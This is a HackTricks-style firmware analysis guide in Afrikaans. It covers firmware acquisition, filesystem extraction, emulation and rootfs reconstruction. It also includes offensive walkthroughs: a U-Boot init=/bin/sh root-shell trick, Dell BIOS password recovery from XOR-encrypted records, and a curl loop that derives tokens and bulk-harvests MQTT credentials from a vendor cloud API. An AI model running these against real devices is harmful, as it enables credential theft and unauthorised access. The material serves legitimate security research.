# Firmware-analise

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Inleiding**

### Verwante hulpbronne

Vir verkryging via blootgestelde hardeware-koppelvlakke, sien [UART-konsole-ondersteunde firmware-dumping](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) en [SPI-flash-dumping](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Vir herhaalbare UART-opname tydens selflaaityd, voordat toegang tot die konsole verkry word, sien [SCPI-beheerde krag- en ossilloskoopverkryging](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware is noodsaaklike sagteware wat toestelle help om korrek te werk deur kommunikasie tussen die hardewarekomponente en die sagteware waarmee gebruikers interaksie het, te bestuur en te fasiliteer. Dit word in permanente geheue gestoor, sodat die toestel vanaf die oomblik dat dit aangeskakel word toegang tot belangrike instruksies het, wat die bedryfstelsel laat begin. Die ondersoek en moontlike wysiging van firmware is ’n kritieke stap om sekuriteitskwesbaarhede te identifiseer.<sup>[[2]](#references)[[3]](#references)</sup>

## **Inligting insamel**

**Inligting insamel** is ’n kritieke eerste stap om ’n toestel se samestelling en die tegnologieë wat dit gebruik, te verstaan. Hierdie proses behels die insameling van data oor:

- Die CPU-argitektuur en bedryfstelsel waarop dit loop
- Besonderhede oor die bootloader
- Hardeware-uitleg en datablaaie
- Metrieke oor die kodebasis en bronkode-liggings
- Eksterne biblioteke en lisensietipes
- Opdateringsgeskiedenis en regulatoriese sertifisering
- Argitektuur- en vloeidiagramme
- Sekuriteitsbeoordelings en geïdentifiseerde kwesbaarhede

Vir hierdie doel is **openbronintelligensie (OSINT)**-nutsmiddels onontbeerlik, asook die ontleding van enige beskikbare openbronsagtewarekomponente deur middel van handmatige en outomatiese hersieningsprosesse. Nutsmiddels soos [Coverity Scan](https://scan.coverity.com) en [Semmle’s LGTM](https://lgtm.com/#explore) bied gratis statiese ontleding wat gebruik kan word om moontlike probleme te vind.

## **Die firmware verkry**

Firmware kan op verskeie maniere verkry word, elk met ’n eie vlak van kompleksiteit:

- **Direk** vanaf die bron (ontwikkelaars, vervaardigers)
- Deur dit volgens verskafte instruksies te **bou**
- Deur dit van amptelike ondersteuningswebwerwe af te **laai**
- Deur **Google dork**-navrae te gebruik om firmwarelêers te vind wat aangebied word
- Deur direk toegang tot **wolkberging** te verkry, met nutsmiddels soos [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Deur **opdaterings** met man-in-the-middle-tegnieke te onderskep
- Deur dit uit die toestel te **onttrek** via verbindings soos **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash), of **PICit**
- Deur opdateringsversoeke in toestelkommunikasie te **snuffel**
- Deur **hardgekodeerde opdaterings-eindpunte** te identifiseer en te gebruik
- Deur dit vanaf die bootloader of netwerk te **dump**
- Deur die bergingskyfie te **verwyder en te lees**, as ’n laaste uitweg, met toepaslike hardeware-nutsmiddels

### Slegs UART-logboeke: dwing ’n root-shell af via U-Boot-env in flash

As UART RX geïgnoreer word (slegs logboeke), kan jy steeds ’n init-shell afdwing deur die **U-Boot-omgewingsblob** vanlyn te **wysig**:<sup>[[6]](#references)</sup>

1. Dump SPI-flash met ’n SOIC-8-knippie en programmeerder (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Soek die U-Boot env-partisie, wysig `bootargs` om `init=/bin/sh` in te sluit, en **bereken die U-Boot env CRC32 vir die blob oor**.
3. Flits slegs die env-partisie weer en herlaai; ’n shell behoort op UART te verskyn.

Dit is nuttig op ingebedde toestelle waar die selflaaiprogram se shell gedeaktiveer is, maar die env-partisie via eksterne flashtoegang skryfbaar is.

### Beskermde kode blootlê deur ’n Firewall-kopieertaak

Sommige MCU’s laat onbeskermde toepassingskode toe om ’n gateway in ’n beskermde streek aan te roep, eerder as om beskermde Flash direk te lees. Nadat jy kode-uitvoering in die toepassing verkry het, ondersoek elke gateway-taak as ’n afsonderlike geheueoordrag-primitief. In die Cypherock X1-geval het die STM32L4 Firewall-oproephek ’n taak, ’n eksterne `data`-wyser, ’n lengte en ’n beskermde `address` aanvaar. ’n Skryftaak het versuim om ’n `data`-bronwyser na Firewall Code te verwerp. Die aanroeper kon nie daardie kode direk lees nie, maar die gateway self kon dit na beskermde nie-vlugtige berging kopieer, waar ’n toegelate leestaak dit beskikbaar gestel het.<sup>[[15]](#references)</sup>

Om hierdie tipe blootlegging te herhaal, identifiseer ’n skryfbare beskermde bergingsbladsy met ’n ooreenstemmende leestaak, stel die skryfbron op opeenvolgende beskermde-kodeadresse en lees die gefaseerde grepe terug. Gaan die bergingsmedium na voordat jy skryfbewerkings herhaal: in hierdie geval was dit Flash, dus moes ’n bladsy uitgevee word voordat dit hergebruik kon word. Die navorsers het ’n roetine gebruik wat die geldige Secure Data Storage-inhoud uitgevee en herstel het, en daarna kode in die oorblywende vrye ruimte geplaas in plaas daarvan om beursiedata te oorskryf. Dit vereis kode-uitvoering op die MCU en ’n bereikbare oproephek; dit is nie ’n direkte lees-omseiling vanaf ’n ongeverifieerde gasheer nie.<sup>[[15]](#references)</sup>

Die herwonne kode kan [vertrouensgapings in firmware-opdaterings en selflaai-integriteit](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata) blootlê.<sup>[[15]](#references)</sup>

## Ontleding van die firmware

Noudat jy **die firmware het**, moet jy inligting daaroor onttrek om te weet hoe om dit te hanteer. Daar is verskillende nutsmiddels wat jy hiervoor kan gebruik:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

As jy nie veel met daardie nutsgoed vind nie, kontroleer die **entropie** van die beeld met `binwalk -E <bin>`; as die entropie laag is, is dit waarskynlik nie geënkripteer nie. As die entropie hoog is, is dit waarskynlik geënkripteer (of op een of ander manier saamgepers).

Jy kan ook hierdie nutsgoed gebruik om **lêers wat in die firmware ingebed is** te onttrek:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Of gebruik [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) om die lêer te inspekteer.

### Rou vertoonbates in eksterne flitsgeheue

'n Eksterne SPI-dump is nie noodwendig die MCU se uitvoerbare firmware nie. Vergelyk vir 'n Cortex-M-teiken die begin van elke moontlike kodegebied met die geheuekaart van die toestel: 'n normale vektortabel begin met 'n geloofwaardige SRAM-stapelwyser en 'n reset-handler-adres in uitvoerbare geheue. Die afwesigheid van 'n vektortabel by offset nul bewys op sigself nie dat die hele skyfie geen kode bevat nie; inspekteer ander offsets en die selflaai-opstelling. As `binwalk` geen houer vind nie, inspekteer die rou grepe en bring die flitsleesadresse van 'n [gedekodeerde SPI-opname](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) in verband met handelinge wat nuwe skerms laai.<sup>[[14]](#references)</sup>

Probeer vir 'n vertoonbategebied moontlike pixel-formate en afmetings, eerder as om PNG/JPEG te aanvaar. Die aangehaalde toestel het **80×160 RGB565 little-endian**-rame gebruik: teen twee grepe per pixel is 'n raam **25,600 grepe** (25 KiB), nie 24 kilobits nie. 'n Gedekodeerde flitsleesadres het die offset van die skermbate aangedui; die navorser het 'n voorbereide beeld omgeskakel met `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, die bate van dieselfde grootte in die oorspronklike dump vervang, dit geskryf met `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` en die nuwe beeld op die skerm bevestig. Dit demonstreer skryfbare *eksterne vertoonbates*, nie die onttrekking of herflitsing van die MCU se interne firmware nie. Bewaar die oorspronklike dump en verifieer die afmetings, bytevolgorde, offset en vervangingslengte voordat jy skryf.<sup>[[14]](#references)</sup>

### Differensiële flitsanalise en herwinbare XOR-geheime bergings

Wanneer 'n firmware-instelling geen gedokumenteerde bergingsformaat het nie, neem eers verskeie ooreenstemmende flitslesings, verander **presies een** instelling, maak weer 'n volledige dump van die skyfie en vergelyk die offsets. Deur die eksperiment met beheerde waardes te herhaal, kan jy die instelling van tellers en skryfmetadata onderskei; veranderinge by nuwe offsets eerder as in plek dui op 'n slegs-byvoegende of loggestruktureerde berging. Bewaar geskrapte/tombstone-inskrywings, want hul loonvraggrepe kan dalk steeds herwin word.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Nadat jy die streek opgespoor het, onttrek die firmware-modules met nutsgoed soos `binwalk` en reverse-engineer die writer/validator in Ghidra. Bevestig veldgrense, opvulling, sleutelindeksering en sleutelafleiding in die kode, eerder as om die skema slegs uit patrone in die syferteks af te lei.<sup>[[12]](#references)</sup>

#### Herwin sleutels uit geënkripteerde nul-opvulling

Soos beskryf in [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), onthul bekende plaintext keystream-grepe by dieselfde offsets. ’n Veld met ’n vaste grootte is besonder kwesbaar wanneer sy nul-opvulling elke indeks van ’n herhalende XOR-sleutel dek: die geënkripteerde opvulling onthul daardie sleutelgrepe direk, want `0x00 XOR key_byte = key_byte`. As elke sleutelindeks gedek word, rekonstrueer die sleutel uit die syferteks se stert en dekripteer die ingevulde grepe.<sup>[[12]](#references)</sup>

Dell se kwesbare DVAR BIOS-wagwoordformaat is ’n konkrete voorbeeld: greep `0` van ’n veld van 32 grepe is plaintext, terwyl grepe `1..31` ’n herhalende sleutel van 20 grepe gebruik.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Vir ’n wagwoordlengte `L` was posisies `L..31` nul voor XOR. Wanneer `L <= 12`, dek daardie posisies elke sleutelindeks, dus word die volledige sleutel en wagwoord sonder brute force herwin:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Haal sleutels uit historiese rekords

Moenie elke rekord afsonderlik ontleed nie. Die DVAR-sleutel word ongeveer afgelei as `modified_md5(device_seed || variable_GUID || password[0])`: die device seed en GUID is vas, en die enigste wagwoordafhanklike invoer is die eerste duidelike greep. Dit gee hoogstens 256 sleutels per toestel, en rekords wat met dieselfde greep begin, deel dus ’n sleutel. Groepeer aktiewe en geskrapte rekords volgens daardie greep; ’n kort historiese rekord kan die volle sleutel deur padding leak en ’n huidige, langer rekord ontsleutel waarvoor die padding alleen nie voldoende is nie. Wagwoordrotasie kan blootstelling dus verhoog wanneer ou ciphertext getombstone word eerder as uitgevee.<sup>[[12]](#references)</sup>

Die [`dellpwn`](https://github.com/R3n5k1/dellpwn)-nutsding vind DVAR, valideer kandidaatrekords, herwin wagwoorde en kan rou gestoorde/sleutelsgrepe vertoon. Bou dit vanaf ’n checkout en skandeer ’n geverifieerde flash-beeld soos volg:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Vir pasgemaakte parsers, verwerp vals positiewe met behulp van rekordstruktuur, beperkings op drukbare karakters, kontroles vir nulopvulling, sleutelentropie en konsekwentheid waar die sleutel omvou. As herhaalde dumps yl biswisselings per skryfaksie toon, lys die waargenome maskers en rangskik die regstellings volgens hierdie beperkings, maar rapporteer dubbelsinnige karakters eerder as om heuristiese uitset as presiese herwinning voor te stel.<sup>[[12]](#references)</sup>

Wagwoordverifieerders moet ’n gesoute, herhaalde eenrigting-hash stoor eerder as omkeerbare syferteks, en loggestruktureerde bergings moet verouderde geheime materiaal veilig verwyder.<sup>[[12]](#references)</sup>

### Verkryging van die lêerstelsel

Met die voorheen genoemde nutsmiddels, soos `binwalk -ev <bin>`, moes jy die **lêerstelsel kon uittrek**.\
Binwalk trek dit gewoonlik uit binne ’n **lêergids met die naam van die lêerstelseltipe**, wat gewoonlik een van die volgende is: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Handmatige onttrekking van die lêerstelsel

Soms sal binwalk **nie die magic byte van die lêerstelsel in sy signatures hê nie**. Gebruik in hierdie gevalle binwalk om **die offset van die lêerstelsel te vind en die saamgeperste lêerstelsel uit die binêre lêer te carve**, en **onttrek** die lêerstelsel dan handmatig volgens die tipe daarvan deur die stappe hieronder te volg.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Voer die volgende **dd-opdrag** uit om die Squashfs-lêerstelsel te onttrek.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatiewelik kan die volgende opdrag ook uitgevoer word.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Vir squashfs (gebruik in die voorbeeld hierbo)

`$ unsquashfs dir.squashfs`

Lêers sal daarna in die "`squashfs-root`"-gids wees.

- CPIO-argieflêers

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Vir jffs2-lêerstelsels

`$ jefferson rootfsfile.jffs2`

- Vir ubifs-lêerstelsels met NAND-flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Herbou van gesplete ingebedde wortellêerstelsels

As ’n rou eMMC/SSD-dump ’n geldige lêerstelselkopstuk bevat, maar sy metadata-offsets buite die nominale partisie strek, moet dit nie onmiddellik as korrup geklassifiseer word nie. Ingebedde selflaaikode kan die werklike worteltoestel uit verskeie fisiese reekse met Device Mapper saamstel, dus lewer carving van een GPT-partisie slegs die eerste segment.<sup>[[9]](#references)</sup>

#### Triage van die volledige media-beeld

Verifieer eers dat die verkryging voltooi is, die grootte stabiel is en geen skrywer die beeld steeds in gebruik het nie. As die lêernaam ’n begin-/eindadres kodeer, vergelyk daardie reeks met die werklike aantal grepe. Herstel die GPT in leesalleenmodus en koppel slegs die vereiste reeks; moenie `vgchange -ay` teen ’n onvertroude fisiese volume op die werkstasie uitvoer nie, aangesien volumegroepbotsings en onbedoelde skryfbewerkings moontlik is.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Verkies ’n weggooibare VM wanneer die oorspronklike init-logika of ’n LVM-stapel die hele image moet kan sien. Historiese selflaailogboeke van ’n standaard-selflaaipartisie is besonder nuttig: die selflaaiprogram het dalk eie houer-offsets, komponentlengtes, gleufkeuse, belyningsreëls en handtekeningverifikasie aangeteken. Gebruik dié waardes om ’n ingebedde opdragreël/kernel/initramfs uit te sny, en valideer dan elke uitvoer afsonderlik met `file`, magiese grepe en `binwalk`; as jy tot aan die einde van die houer lees, kan ’n initrd, ACPI-objek of handtekening per ongeluk agteraan die kernel gevoeg word.<sup>[[9]](#references)</sup>

#### Herwin die blokkaart tydens selflaai

Onttrek die kernel se initramfs en reverse-engineer sy `/init` en enige bergingsbiblioteke. Volg in [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) stringverwysings vir `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` en partisiepaaie; spoor dan die kode na wat die aktiewe A/B-gleuf kies en die tabel opstel. Nuttige beginpunte in radare2 is `r2 -A init`, `afl`, `pdf @ main` en `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Die linear-teiken karteer opeenvolgende reekse van ’n virtuele toestel op reekse van een of meer rugsteuntoestelle. ’n Herwonne tabel met twee segmente het dikwels hierdie vorm (alle posisies en lengtes is 512-grepe-sektore):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Reproduseer die masjienkode-aritmetika presies, insluitend heelgetalwydte, verskuiwings en eenheidsomskakelings. Die volgende uitdrukking rond byvoorbeeld ’n greottte in grepe af tot ’n 4-KiB-grens en skakel dit eers daarna om na 512-greepsektore; as jy dit vervang met `p4_bytes // 512`, verskuif die geselekteerde stert met `p4_bytes % 4096` wanneer die partisie nie op ’n bladsygrens is nie.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Herbou ’n plat analisebeeld deur die reekse in tabelvolgorde met begrensde blokke te kopieer, eerder as om die volledige mediadump in die geheue te laai. Dit voorkom ook dat mapper-toestelle aan die gasheerkant geskep word. Hou die GPT-afgeleide offsets, omgekeerde sektortellings en die gevolglike uitvoerlengte as afsonderlike bewerings.<sup>[[9]](#references)</sup>

#### Onderskei korrupsie van ’n konstante rekonstruksiefout

Vir SquashFS, kontroleer die `hsqs`-magic en dekodeer die little-endian 64-bis `bytes_used`-veld by superblok-offset 40 voordat jy `unsquashfs` uitvoer. As ekstraksie in verskeie onverwante strukture misluk, soek ’n breë venster rondom die verwagte posisies en vereis sterk strukturele kandidate: ’n dekomprimeerbare metadatablok, verskeie opeenvolgende geldige gidsinskrywings, geloofwaardige inode-velde, ’n wortelinode wat ooreenstem met die inode-telling, of ’n geldige integriteitmetadatustruktuur. Een enkele magic-treffer is onvoldoende.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Wanneer dieselfde getekende delta onafhanklike strukture geldig maak—byvoorbeeld gidsmetadata en ’n verity-rekord—is die waarskynlike oorsaak ’n sistematiese segmentbeginfout eerder as ontbrekende grepe. Gaan terug na die omgekeerde berekening en soek na weggooide reste, signedness, oorloop of sektor-/bladsyafronding voordat jy probeer om weeskinddata te herstel of lêerstelselmetadata te patch.<sup>[[9]](#references)</sup>

Hou laastens die beskermingsgrense apart: TPM-verseëlde LUKS-volumes beskerm datavertroulikheid, terwyl ’n ondertekende dm-verity-kartering die wortellêerstelsel se integriteit beskerm. ’n Sagteware-TPM kan nie ’n sleutel herstel wat aan die oorspronklike fisiese TPM verseël is nie, en die selflaai van ’n gewysigde SquashFS deur ’n navorsingsinit wat verity-verifikasie weglaat, vervals nie die handtekening daarvan of breek dm-verity nie.<sup>[[9]](#references)</sup>

## Ontleding van firmware

Sodra die firmware verkry is, is dit noodsaaklik om dit te ontleed om die struktuur en moontlike kwesbaarhede daarvan te verstaan. Hierdie proses behels die gebruik van verskeie nutsmiddels om die firmwarebeeld te ontleed en waardevolle data daaruit te onttrek.

### Aanvanklike ontledingsnutsmiddels

Vir bykomende firmware-ontledingsnutsmiddels en leesstof, sien die [firmware-afdeling van Third-Party Tools and Resources](../../generic-methodologies-and-resources/third-party-tools-and-resources.md#firmware).

’n Stel opdragte word verskaf vir aanvanklike inspeksie van die binêre lêer (waarna verwys word as `<bin>`). Hierdie opdragte help om lêertipes te identifiseer, stringe te onttrek, binêre data te ontleed en die partisie- en lêerstelselbesonderhede te verstaan:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Om die enkripsiestatus van die beeld te bepaal, word die **entropie** met `binwalk -E <bin>` nagegaan. Lae entropie dui op ’n gebrek aan enkripsie, terwyl hoë entropie op moontlike enkripsie of kompressie dui.

Vir die onttrekking van **ingebedde lêers** word nutsgoed en hulpbronne soos die **file-data-carving-recovery-tools**-dokumentasie en **binvis.io** vir lêerinspeksie aanbeveel.

### Onttrekking van die lêerstelsel

Met `binwalk -ev <bin>` kan ’n mens gewoonlik die lêerstelsel onttrek, dikwels na ’n gids wat na die lêerstelseltipe vernoem is (bv. squashfs, ubifs). Wanneer **binwalk** egter nie die lêerstelseltipe herken nie omdat magic bytes ontbreek, is handmatige onttrekking nodig. Dit behels dat `binwalk` gebruik word om die lêerstelsel se offset te vind, gevolg deur die `dd`-opdrag om die lêerstelsel uit te sny:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Daarna word verskillende opdragte gebruik om die inhoud handmatig uit te pak, afhangend van die lêerstelseltipe (bv. squashfs, cpio, jffs2, ubifs).

### Lêerstelselontleding

Sodra die lêerstelsel uitgepak is, begin die soektog na sekuriteitsfoute. Daar word aandag gegee aan onveilige netwerkdaemons, hardgekodeerde geloofsbriewe, API-eindpunte, funksionaliteit van opdateringsbedieners, ongekompileerde kode, opstartscripts en gekompileerde binaries vir vanlyn ontleding.

**Belangrike liggings** en **items** om te inspekteer, sluit in:

- **etc/shadow** en **etc/passwd** vir gebruikersgeloofsbriewe
- SSL-sertifikate en -sleutels in **etc/ssl**
- Konfigurasie- en scriptlêers vir moontlike kwesbaarhede
- Ingebedde binaries vir verdere ontleding
- Algemene IoT-toestelwebbedieners en binaries

Verskeie nutsmiddels help om sensitiewe inligting en kwesbaarhede in die lêerstelsel op te spoor:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) en [**Firmwalker**](https://github.com/craigz28/firmwalker) om sensitiewe inligting te soek
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) vir omvattende firmware-ontleding
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) en [**EMBA**](https://github.com/e-m-b-a/emba) vir statiese en dinamiese ontleding

### Sekuriteitskontroles van gekompileerde binaries

Beide bronkode en gekompileerde binaries wat in die lêerstelsel gevind word, moet vir kwesbaarhede ondersoek word. Nutsmiddels soos **checksec.sh** vir Unix-binaries en **PESecurity** vir Windows-binaries help om onbeskermde binaries te identifiseer wat uitgebuit kan word.

## Verkryging van cloud-konfigurasie en MQTT-geloofsbriewe via afgeleide URL-tokens

Baie IoT-hubs haal hul toestelspesifieke konfigurasie by ’n cloud-eindpunt wat soos volg lyk:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Tydens firmware-ontleding kan jy vind dat `<token>` plaaslik uit die toestel-ID afgelei word met behulp van ’n hardgekodeerde geheim, byvoorbeeld:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Hierdie ontwerp stel enigiemand wat ’n deviceId en die STATIC_KEY ken in staat om die URL te rekonstrueer en cloud-konfigurasie af te haal, wat dikwels gewone teks-MQTT-geloofsbriewe en onderwerpvoorvoegsels openbaar.

Praktiese werkvloei:

1) Haal deviceId uit UART-selflaailogboeke

- Koppel ’n 3.3V UART-adapter (TX/RX/GND) en neem die logboeke vas:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Soek na reëls wat die wolk-konfigurasie-URL-patroon en broker-adres uitvoer, byvoorbeeld:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Herwin STATIC_KEY en token-algoritme uit firmware

- Laai binaries in Ghidra/radare2 en soek na die config-pad ("/pf/") of MD5-gebruik.
- Bevestig die algoritme (bv. MD5(deviceId||STATIC_KEY)).
- Lei die token in Bash af en maak die digest hoofletters:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Versamel cloud-konfigurasie en MQTT-aanmeldbesonderhede

- Stel die URL saam en haal JSON met curl op; ontleed dit met jq om geheime te onttrek:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Misbruik plaintext MQTT en swak topic ACLs (indien teenwoordig)

- Gebruik herwonne aanmeldbewyse om op maintenance topics in te teken en na sensitiewe gebeurtenisse te soek:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Lys voorspelbare toestel-ID's op (op groot skaal, met toestemming)

- Baie ekosisteme bevat vendor-OUI-/produk-/tipe-grepe, gevolg deur 'n opeenvolgende agtervoegsel.
- Jy kan kandidaat-ID's iteratief nagaan, tokens aflei en configs programmaties ophaal:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notas
- Verkry altyd uitdruklike toestemming voordat jy massale enumerasie probeer.
- Verkies emulasie of statiese analise om geheime te herwin sonder om teikenhardeware te wysig, waar moontlik.


Die proses om firmware te emuleer, maak **dinamiese analise** van óf ’n toestel se werking óf ’n individuele program moontlik. Hierdie benadering kan uitdagings met hardeware- of argitektuurafhanklikhede teëkom, maar die oordrag van die root-lêerstelsel of spesifieke binaries na ’n toestel met ’n ooreenstemmende argitektuur en bytevolgorde, soos ’n Raspberry Pi, of na ’n voorafgeboude virtuele masjien, kan verdere toetsing vergemaklik.

### Emulasie van individuele binaries

Wanneer enkele programme ondersoek word, is dit noodsaaklik om die program se bytevolgorde en SVE-argitektuur te identifiseer.

#### Voorbeeld met MIPS-argitektuur

Om ’n binary vir ’n MIPS-argitektuur te emuleer, kan die volgende opdrag gebruik word:

```bash
file ./squashfs-root/bin/busybox
```

En om die nodige emulasienutsgoed te installeer:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Vir MIPS (big-endian) word `qemu-mips` gebruik, en vir little-endian-binaries is `qemu-mipsel` die gepaste keuse.

#### ARM-argitektuuremulasie

Vir ARM-binaries is die proses soortgelyk: die `qemu-arm`-emulator word vir emulasie gebruik.

### Volledige stelselemulasie

Gereedskap soos [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) en ander vergemaklik volledige firmware-emulasie, outomatiseer die proses en help met dinamiese analise.

### Herbou van gesplete en geverifieerde wortellêerstelsels vir emulasie

As ’n SquashFS-superblok leesbaar is, maar die inode-, gids- of fragmenttabel-offsets onmoontlik lyk, moet jy nie dadelik `unsquashfs` regmaak nie. Reverse-engineer die vroeë selflaaibinêre lêer en reproduseer die bloktoestelgrafiek wat dit skep: ingebedde stelsels kan ’n nominale wortelpartisie blootlê, maar die werklike lêerstelsel konstrueer met ’n `dm-linear`-kartering wat sektore wat by ’n ander partisie geleen is, aanlas. Kontroles wat slegs die superblok nagaan, kan slaag selfs wanneer elke daaropvolgende metadatablok verskuif is.<sup>[[11]](#references)</sup>

Behoud die firmware se rekenkunde presies. Bepaal veral of lengtes in grepe, 512-greep-sektore of 4 KiB-bladsye uitgedruk word; reproduseer verskuiwings en afkapping in hul oorspronklike volgorde; en neem bankafhanklike stertstreke in A/B-uitlegte in ag. Byvoorbeeld, `(partition_bytes >> 12) << 3` kap eers af tot ’n 4 KiB-grens en druk die resultaat dan as 512-greep-sektore uit; as jy dit met `partition_bytes // 512` vervang, kan die aangehegte omvang met ’n paar kilogrepe verskuif en al die daaropvolgende SquashFS-tabelle beskadig.<sup>[[11]](#references)</sup>

’n Nuttige valideringswerkvloei is:<sup>[[11]](#references)</sup>

1. Herwin elke `dm-linear`-segment se brontoestel, beginsektor en lengte uit die verifier-/init-binêre lêer.
2. Voeg die omvangdele saam of karteer hulle sonder om hul belyningssemantiek te verander.
3. As ekstraksie steeds misluk, soek slegs ’n klein venster rondom die voorspelde grens en vereis verskeie opeenvolgende geldige metadatastrukture, eerder as om net ’n geloofwaardige superblok te aanvaar.
